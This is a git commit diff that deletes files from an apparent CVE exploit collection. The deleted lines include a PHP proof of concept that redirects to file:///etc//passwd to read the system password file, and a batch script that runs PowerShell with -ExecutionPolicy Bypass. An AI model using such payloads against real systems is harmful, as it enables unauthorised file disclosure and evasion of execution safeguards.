8aa31776537096cce615c188b636a1f23d0fbe41
Nikhil Yadav <69293613+yadavnikhil17102004@users.noreply.github.com>
2026-02-21 15:02:03 +0530

    fix(core): nuke 100+ MB of legacy gigabyte exploit clones to resolve out-of-space action crash & fix standard input bug natively via go flag bypass

--- 2020/CVE-2020-21365/index.php
+++
@@ -1,9 +0,0 @@
-<!DOCTYPE html>
-<html>
-<body>
-
-<h1>Command output:</h1>
-<?php header('location:file:///etc//passwd');
-?>
-
-</body></html>
--- 2025/CVE-2025-2120/Run.bat
+++
@@ -1,3 +0,0 @@
-@echo off
-cd /d "%~dp0"
-powershell -ExecutionPolicy Bypass -File "%~dp0Reset.ps1"
